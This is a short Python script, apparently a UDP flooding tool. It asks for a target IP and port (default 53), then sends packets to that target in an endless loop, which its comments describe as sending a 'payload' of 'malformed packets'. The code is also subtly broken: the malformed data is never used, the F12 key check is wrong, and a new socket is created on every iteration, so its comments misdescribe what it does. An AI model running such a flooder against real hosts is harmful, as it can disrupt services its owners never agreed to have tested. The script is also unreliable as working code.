import socket
import msvcrt
import random

class target:
    #prompting user for destination address and port number.
    def targetpip(self):
        self.udpdestip = input("Enter destination address : ") or "0.0.0.0"
        udpdestport = input("Enter destination port (defaults to port 53):")
        self.udpdestport = int(udpdestport) if udpdestport.isdigit() else 53
        return (self.udpdestip, self.udpdestport)

    def __str__(self):
        return "{}:{}".format(self.udpdestip, self.udpdestport)

t = target()
t.targetpip()
rand_num = random.randint(1,100)

#final confirmation message before sending payload.
print("Confirm target IP and port :",t)
while True:
    if msvcrt.kbhit():
        if ord(msvcrt.getch()) == 0x8B: # breaks if key F12 is hit.
            break     
    #sending malformed packets to target IP and port using random bytes.
    malformed_data = bytes("Hello, World!", "utf-8")[:rand_num] + b'\x00' + bytes("Hello, World!", "utf-8")[rand_num+1:]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(bytes("Hello, World!", "utf-8"), (t.udpdestip, t.udpdestport))
    print("Packet sent!")

print("Sending packets stopped.")






